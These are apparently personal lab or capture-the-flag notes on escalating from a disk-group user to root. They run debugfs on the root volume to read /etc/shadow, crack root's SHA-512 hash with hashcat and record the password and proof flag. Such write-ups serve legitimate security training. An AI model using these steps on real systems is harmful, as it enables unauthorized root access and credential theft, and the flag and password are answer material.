Upgrade shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
(Ctrl-Z)
stty raw -echo; fg
```

# System Information Gathering

## Get current user and group memberships.

```
id
```

```
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
```

Disk immediately stands out to me as something unusual.

https://www.hackingarticles.in/disk-group-privilege-escalation/

root (/) is mounted on /dev/mapper/ubuntu--vg-ubuntu--lv

![[Pasted image 20251005134041.png]]

```
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
mkdir test
cat /etc/shadow
```

Extract root's hash:

```
$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::
```

Crack as done earlier, except using -m 1800 now for SHA512 (Unix)

root.hash
```
$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.
```

`hashcat -m 1800 root.hash /usr/share/wordlists/rockyou.txt`

Root's password is explorer.

![[Pasted image 20251005135947.png]]

/root/proof.txt:
b1a3481469bfd0eec70d42211273a43d
